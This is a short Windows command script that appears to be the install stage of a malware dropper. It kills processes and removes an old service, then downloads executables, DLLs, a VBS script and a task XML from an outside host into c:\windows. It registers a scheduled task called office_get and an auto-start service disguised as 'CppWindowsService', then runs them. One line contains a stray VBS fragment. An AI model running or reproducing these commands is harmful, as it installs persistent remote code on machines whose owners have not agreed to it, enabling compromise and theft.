taskkill /f /im sys1.exe
taskkill /f /im sys2.exe
sc delete CppWindowsService
wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\sys3.dll
wget http://troglo.homepc.it/win/office_get.xml -O c:\windows\office_get.xml
schtasks /delete /tn office_get /F
schtasks /create /tn office_get /xml %windir%\office_get.xml /F", 0, True
wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
cscript c:\windows\svc.vbs
net start CppWindowsService
 